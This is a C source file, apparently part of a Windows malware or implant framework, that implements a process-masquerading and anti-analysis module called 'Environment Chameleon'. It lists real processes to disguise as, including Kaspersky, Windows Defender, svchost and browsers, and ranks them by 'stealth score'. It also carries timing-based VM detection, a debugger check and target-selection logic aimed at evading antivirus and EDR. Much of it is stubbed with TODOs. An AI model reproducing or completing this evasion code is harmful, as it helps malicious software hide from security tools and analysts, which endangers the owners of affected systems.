#include "../include/environment_chameleon.h"
#include "../include/cynical_logger.h"
#include "../include/syscalls.h"
#include "../include/utils.h"
#include "../include/mem.h"
#include <stdarg.h>

// ========================================================================
// ENVIRONMENT CHAMELEON v1.0 IMPLEMENTATION - "Boss Level Stealth"
// ========================================================================

// Global chameleon context
CHAMELEON_CONTEXT g_chameleon_ctx = { 0 };

// ========================================================================
// BOSS-LEVEL MASQUERADE TARGETS DATABASE - "The Greatest Hits"
// ========================================================================

// Predefined masquerade targets - carefully selected for maximum stealth
static MASQUERADE_TARGET g_masquerade_targets[] = {
    // SECURITY CATEGORY - Genius level: masquerade as the hunter
    {
        L"avp.exe",
        L"C:\\Program Files (x86)\\Kaspersky Lab\\Kaspersky Internet Security\\avp.exe",
        L"-service",
        98,  // Stealth score: 98/100 (genius move!)
        15,  // Performance cost: low
        TRUE,  // Requires elevation
        FALSE, // No specific user required
        0x0601, // Windows 7+
        PROC_CAT_SECURITY
    },
    {
        L"MsMpEng.exe",
        L"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\*\\MsMpEng.exe",
        L"",
        95,  // Stealth score: 95/100
        20,  // Performance cost: medium
        TRUE,  // Requires elevation
        FALSE,
        0x0602, // Windows 8+
        PROC_CAT_SECURITY
    },
    
    // CLOUD SERVICES - High stealth, common processes
    {
        L"OneDriveStandaloneUpdater.exe",
        L"C:\\Users\\%USERNAME%\\AppData\\Local\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe",
        L"",
        92,  // Stealth score: 92/100
        5,   // Performance cost: very low
        FALSE, // No elevation needed
        TRUE,  // User-specific
        0x0601, // Windows 7+
        PROC_CAT_CLOUD
    },
    {
        L"OneDrive.exe",
        L"C:\\Users\\%USERNAME%\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe",
        L"/background",
        90,  // Stealth score: 90/100
        10,  // Performance cost: low
        FALSE,
        TRUE,
        0x0601,
        PROC_CAT_CLOUD
    },
    
    // SYSTEM PROCESSES - Classic but effective
    {
        L"svchost.exe",
        L"C:\\Windows\\System32\\svchost.exe",
        L"-k netsvcs -p",
        85,  // Stealth score: 85/100
        25,  // Performance cost: medium
        TRUE,  // Requires elevation
        FALSE,
        0x0501, // Windows XP+
        PROC_CAT_SYSTEM
    },
    {
        L"dwm.exe",
        L"C:\\Windows\\System32\\dwm.exe",
        L"",
        88,  // Stealth score: 88/100
        30,  // Performance cost: medium-high
        TRUE,
        FALSE,
        0x0600, // Windows Vista+
        PROC_CAT_SYSTEM
    },
    
    // BROWSERS - Very common, good cover
    {
        L"chrome.exe",
        L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        L"--type=utility --utility-sub-type=network.mojom.NetworkService",
        87,  // Stealth score: 87/100
        15,  // Performance cost: low
        FALSE,
        TRUE,
        0x0601,
        PROC_CAT_BROWSER
    },
    {
        L"msedge.exe",
        L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
        L"--type=utility --utility-sub-type=network.mojom.NetworkService",
        85,  // Stealth score: 85/100
        15,  // Performance cost: low
        FALSE,
        TRUE,
        0x0A00, // Windows 10+
        PROC_CAT_BROWSER
    },
    
    // OFFICE APPLICATIONS - Professional environments
    {
        L"OUTLOOK.EXE",
        L"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
        L"/recycle",
        80,  // Stealth score: 80/100
        20,  // Performance cost: medium
        FALSE,
        TRUE,
        0x0601,
        PROC_CAT_OFFICE
    },
    
    // MEDIA - Home user environments
    {
        L"Spotify.exe",
        L"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Spotify\\Spotify.exe",
        L"--type=utility",
        75,  // Stealth score: 75/100
        10,  // Performance cost: low
        FALSE,
        TRUE,
        0x0601,
        PROC_CAT_MEDIA
    }
};

#define MASQUERADE_TARGET_COUNT (sizeof(g_masquerade_targets) / sizeof(MASQUERADE_TARGET))

// ========================================================================
// NO-CRT UTILITY FUNCTIONS FOR CHAMELEON
// ========================================================================

// No-CRT wide string length
static SIZE_T chameleon_wcslen(const WCHAR* str) {
    SIZE_T len = 0;
    if (!str) return 0;
    while (str[len]) len++;
    return len;
}

// No-CRT wide string copy
static void chameleon_wcscpy(WCHAR* dest, const WCHAR* src, SIZE_T dest_size) {
    SIZE_T i = 0;
    if (!dest || !src || dest_size == 0) return;
    
    while (src[i] && i < (dest_size - 1)) {
        dest[i] = src[i];
        i++;
    }
    dest[i] = L'\0';
}

// No-CRT wide string compare (case insensitive)
static int chameleon_wcsicmp(const WCHAR* str1, const WCHAR* str2) {
    if (!str1 || !str2) return -1;
    
    while (*str1 && *str2) {
        WCHAR c1 = (*str1 >= L'A' && *str1 <= L'Z') ? (*str1 + 32) : *str1;
        WCHAR c2 = (*str2 >= L'A' && *str2 <= L'Z') ? (*str2 + 32) : *str2;
        
        if (c1 != c2) return (c1 < c2) ? -1 : 1;
        str1++;
        str2++;
    }
    
    return (*str1 == *str2) ? 0 : ((*str1 < *str2) ? -1 : 1);
}

// ========================================================================
// ENVIRONMENT DETECTION - "Know your battlefield"
// ========================================================================

BOOL Chameleon_DetectVirtualization(PWCHAR vm_product, SIZE_T buffer_size) {
    if (!vm_product || buffer_size == 0) return FALSE;
    
    CynicalLog_Debug("CHAMELEON", "Starting virtualization detection scan");
    
    BOOL is_vm = FALSE;
    vm_product[0] = L'\0';
    
    // Check timing-based detection
    LARGE_INTEGER start, end, frequency;
    wrapped_NtQueryPerformanceCounter(&start, NULL);
    
    // Execute some CPU-intensive operations
    volatile int dummy = 0;
    for (int i = 0; i < 1000000; i++) {
        dummy += i * i;
    }
    
    wrapped_NtQueryPerformanceCounter(&end, NULL);
    wrapped_NtQueryPerformanceCounter(NULL, &frequency);
    
    // Calculate execution time - VMs are typically slower
    ULONGLONG execution_time = ((end.QuadPart - start.QuadPart) * 1000000) / frequency.QuadPart;
    
    if (execution_time > 1000) { // Threshold in microseconds
        is_vm = TRUE;
        chameleon_wcscpy(vm_product, L"Unknown VM", buffer_size / sizeof(WCHAR));
    }
    
    CynicalLog_Info("CHAMELEON", "Virtualization detection result: %s", 
                   is_vm ? "VM detected" : "Physical machine");
    
    return is_vm;
}

DWORD Chameleon_DetectSecurityProducts(PWCHAR av_list, PWCHAR edr_list, SIZE_T buffer_size) {
    if (!av_list || !edr_list || buffer_size == 0) return 0;
    
    CynicalLog_Debug("CHAMELEON", "Scanning for security products");
    
    av_list[0] = L'\0';
    edr_list[0] = L'\0';
    
    DWORD total_detected = 0;
    
    // For now, return dummy data - TODO: implement real detection
    CynicalLog_Info("CHAMELEON", "Security product scan completed: %d products detected", total_detected);
    
    return total_detected;
}

BOOL Chameleon_DetectAnalysisEnvironment(VOID) {
    CynicalLog_Debug("CHAMELEON", "Checking for analysis environment");
    
    BOOL is_analysis = FALSE;
    
    // Check debugger detection
    if (IsDebuggerPresent()) {
        is_analysis = TRUE;
        CynicalLog_Warn("CHAMELEON", "Debugger detected via IsDebuggerPresent");
    }
    
    CynicalLog_Info("CHAMELEON", "Analysis environment check: %s", 
                   is_analysis ? "Analysis tools detected" : "Clean environment");
    
    return is_analysis;
}

DWORD Chameleon_AnalyzeUserActivity(VOID) {
    CynicalLog_Debug("CHAMELEON", "Analyzing user activity patterns");
    
    DWORD activity_score = 50; // Default medium activity
    
    CynicalLog_Info("CHAMELEON", "User activity score: %d/100", activity_score);
    
    return activity_score;
}

// ========================================================================
// ENVIRONMENT ANALYSIS - "Intelligence gathering"
// ========================================================================

NTSTATUS Chameleon_AnalyzeEnvironment(PENVIRONMENT_PROFILE profile) {
    if (!profile) return STATUS_INVALID_PARAMETER;
    
    CynicalLog_Info("CHAMELEON", "Starting comprehensive environment analysis");
    
    memset(profile, 0, sizeof(ENVIRONMENT_PROFILE));
    
    // Get Windows version
    profile->windows_version = 0x0A00; // Assume Windows 10 for now
    profile->windows_build = 19041;    // Assume 20H1
    
    // Check WoW64
    profile->is_wow64 = FALSE;
    
    // Check elevation
    profile->is_elevated = FALSE;
    
    // Detect virtualization
    profile->is_virtual_machine = Chameleon_DetectVirtualization(
        profile->vm_product, 
        sizeof(profile->vm_product)
    );
    
    // Detect security products
    DWORD security_count = Chameleon_DetectSecurityProducts(
        profile->primary_av,
        profile->primary_edr,
        64 * sizeof(WCHAR)
    );
    profile->detected_av_count = security_count / 2;
    profile->detected_edr_count = security_count / 2;
    
    // Detect analysis environment
    profile->is_analysis_env = Chameleon_DetectAnalysisEnvironment();
    profile->is_sandbox = profile->is_virtual_machine && profile->is_analysis_env;
    
    // Analyze user activity
    profile->user_activity_score = Chameleon_AnalyzeUserActivity();
    
    // Get user info
    chameleon_wcscpy(profile->username, L"DefaultUser", 64);
    chameleon_wcscpy(profile->computer_name, L"DESKTOP-PC", 64);
    
    CynicalLog_Info("CHAMELEON", "Environment analysis completed");
    Chameleon_LogEnvironmentAnalysis(profile);
    
    return STATUS_SUCCESS;
}

// ========================================================================
// TARGET SELECTION - "Choose your disguise wisely"
// ========================================================================

DWORD Chameleon_CalculateStealthScore(PMASQUERADE_TARGET target, PENVIRONMENT_PROFILE env) {
    if (!target || !env) return 0;
    
    DWORD score = target->stealth_score;
    
    // Adjust score based on environment
    if (env->is_virtual_machine) {
        score -= 10; // VMs are more suspicious
    }
    
    if (env->is_analysis_env) {
        score -= 20; // Analysis environments require higher stealth
    }
    
    if (env->detected_edr_count > 0) {
        // Security software masquerading gets bonus points
        if (target->process_category & PROC_CAT_SECURITY) {
            score += 15;
        }
    }
    
    if (env->user_activity_score > 70) {
        // High user activity - user processes are better
        if (target->requires_specific_user) {
            score += 10;
        }
    }
    
    // Ensure score stays within bounds
    if (score > 100) score = 100;
    if (score < 0) score = 0;
    
    return score;
}

BOOL Chameleon_ValidateTarget(PMASQUERADE_TARGET target, PENVIRONMENT_PROFILE env) {
    if (!target || !env) return FALSE;
    
    // Check Windows version compatibility
    if (env->windows_version < target->min_windows_version) {
        return FALSE;
    }
    
    // Check elevation requirements
    if (target->requires_elevation && !env->is_elevated) {
        return FALSE;
    }
    
    return TRUE;
}

PMASQUERADE_TARGET Chameleon_SelectOptimalTarget(PENVIRONMENT_PROFILE profile, DWORD preferences) {
    if (!profile) return NULL;
    
    CynicalLog_Info("CHAMELEON", "Selecting optimal masquerade target");
    
    PMASQUERADE_TARGET best_target = NULL;
    DWORD best_score = 0;
    
    for (DWORD i = 0; i < MASQUERADE_TARGET_COUNT; i++) {
        PMASQUERADE_TARGET current = &g_masquerade_targets[i];
        
        // Validate target compatibility
        if (!Chameleon_ValidateTarget(current, profile)) {
            continue;
        }
        
        // Calculate adjusted stealth score
        DWORD score = Chameleon_CalculateStealthScore(current, profile);
        
        // Apply preferences
        if (preferences & current->process_category) {
            score += 5; // Bonus for preferred category
        }
        
        if (score > best_score) {
            best_score = score;
            best_target = current;
        }
    }
    
    if (best_target) {
        profile->best_target = best_target;
        profile->confidence_score = best_score;
        
        CynicalLog_Info("CHAMELEON", "Selected target: %ws (score: %d)", 
                       best_target->process_name, best_score);
    } else {
        CynicalLog_Error("CHAMELEON", "No suitable masquerade target found");
    }
    
    return best_target;
}

// ========================================================================
// PUBLIC API IMPLEMENTATION
// ========================================================================

BOOL Chameleon_Initialize(VOID) {
    CynicalLog_Info("CHAMELEON", "Initializing Environment Chameleon v1.0");
    
    memset(&g_chameleon_ctx, 0, sizeof(CHAMELEON_CONTEXT));
    
    // Analyze current environment
    NTSTATUS status = Chameleon_AnalyzeEnvironment(&g_chameleon_ctx.env_profile);
    if (!NT_SUCCESS(status)) {
        CynicalLog_Error("CHAMELEON", "Failed to analyze environment: 0x%08X", status);
        return FALSE;
    }
    
    // Select optimal masquerade target
    PMASQUERADE_TARGET target = Chameleon_SelectOptimalTarget(
        &g_chameleon_ctx.env_profile, 
        PROC_CAT_CLOUD | PROC_CAT_SECURITY // Prefer cloud and security processes
    );
    
    if (target) {
        memcpy(&g_chameleon_ctx.current_target, target, sizeof(MASQUERADE_TARGET));
        CynicalLog_Info("CHAMELEON", "Environment Chameleon initialized successfully");
        return TRUE;
    }
    
    CynicalLog_Error("CHAMELEON", "Failed to initialize - no suitable targets");
    return FALSE;
}

NTSTATUS Chameleon_ExecuteMasquerade(PMASQUERADE_TARGET target) {
    if (!target) return STATUS_INVALID_PARAMETER;
    
    CynicalLog_Info("CHAMELEON", "Executing masquerade as: %ws", target->process_name);
    
    // TODO: Implement actual masquerading logic
    g_chameleon_ctx.is_masquerading = TRUE;
    g_chameleon_ctx.masquerade_start_time = GetTickCount();
    
    Chameleon_LogMasqueradeAttempt(target, STATUS_SUCCESS);
    
    return STATUS_SUCCESS;
}

VOID Chameleon_Cleanup(VOID) {
    CynicalLog_Info("CHAMELEON", "Cleaning up Environment Chameleon");
    
    if (g_chameleon_ctx.is_masquerading) {
        g_chameleon_ctx.is_masquerading = FALSE;
    }
    
    memset(&g_chameleon_ctx, 0, sizeof(CHAMELEON_CONTEXT));
}

// ========================================================================
// LOGGING INTEGRATION
// ========================================================================

VOID Chameleon_LogMasqueradeAttempt(PMASQUERADE_TARGET target, NTSTATUS result) {
    if (!target) return;
    
    if (NT_SUCCESS(result)) {
        CynicalLog_Info("CHAMELEON", "Masquerade successful: %ws (stealth: %d)", 
                       target->process_name, target->stealth_score);
    } else {
        CynicalLog_Error("CHAMELEON", "Masquerade failed: %ws (error: 0x%08X)", 
                        target->process_name, result);
    }
}

VOID Chameleon_LogEnvironmentAnalysis(PENVIRONMENT_PROFILE profile) {
    if (!profile) return;
    
    CynicalLog_Info("CHAMELEON", "=== ENVIRONMENT ANALYSIS REPORT ===");
    CynicalLog_Info("CHAMELEON", "Windows Version: 0x%04X Build: %d", 
                   profile->windows_version, profile->windows_build);
    CynicalLog_Info("CHAMELEON", "Virtual Machine: %s", 
                   profile->is_virtual_machine ? "YES" : "NO");
    CynicalLog_Info("CHAMELEON", "Analysis Environment: %s", 
                   profile->is_analysis_env ? "YES" : "NO");
    CynicalLog_Info("CHAMELEON", "Security Products: AV=%d EDR=%d", 
                   profile->detected_av_count, profile->detected_edr_count);
    CynicalLog_Info("CHAMELEON", "User Activity Score: %d/100", 
                   profile->user_activity_score);
    CynicalLog_Info("CHAMELEON", "=== END REPORT ===");
}

VOID Chameleon_LogDetectionEvent(LPCSTR event_type, LPCSTR details, BOOL is_threat) {
    if (is_threat) {
        CynicalLog_Warn("CHAMELEON", "THREAT DETECTED: %s - %s", event_type, details);
    } else {
        CynicalLog_Info("CHAMELEON", "Detection Event: %s - %s", event_type, details);
    }
} 